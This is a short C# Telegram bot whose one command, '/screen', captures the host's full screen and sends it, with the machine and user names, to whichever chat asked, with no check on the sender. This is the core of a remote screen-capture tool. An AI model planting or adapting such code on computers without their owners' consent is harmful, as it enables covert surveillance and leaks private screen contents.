using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Telegram.Bot;
using System.Threading;
using Telegram.Bot.Args;
using System.IO;
using Telegram.Bot.Types;
using System.Drawing;
using System.Windows.Forms;

namespace telegrambot
{
    public static class Bot
    {
        private static Api bot;
        private static bool runnable = false;



        public static void start(string token)
        {
            bot = new Api(token);
            var me = bot.GetMe();

            //Bot.OnCallbackQuery += BotOnCallbackQueryReceived;
            bot.OnMessage += BotOnMessageReceived;
            bot.OnMessageEdited += BotOnMessageReceived;
            //Bot.OnInlineQuery += BotOnInlineQueryReceived;
            //Bot.OnInlineResultChosen += BotOnChosenInlineResultReceived;
            //Bot.OnReceiveError += BotOnReceiveError;
            bot.StartReceiving();
        }

        private static void BotOnMessageReceived(object sender, MessageEventArgs e)
        {
            var message = e.Message;

            Console.WriteLine(message.From.FirstName);
            switch (message.Text)
            {
                case "/screen":
                    var fileToSend = new FileToSend("screenshot.jpeg", getScreenshot());
                    bot.SendDocument(message.Chat.Id, fileToSend, Environment.MachineName + " " + Environment.UserName);
                    break;
                default:
                    break;
            }
        }

        public static void stop()
        {
            bot.StopReceiving();
        }

        #region Fun methods
        private static Stream getScreenshot()
        {
            MemoryStream memoryStream = new MemoryStream();
            Graphics graph = null;

            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);

            memoryStream.Position = 0;

            return memoryStream;
        }
        #endregion
    }
}
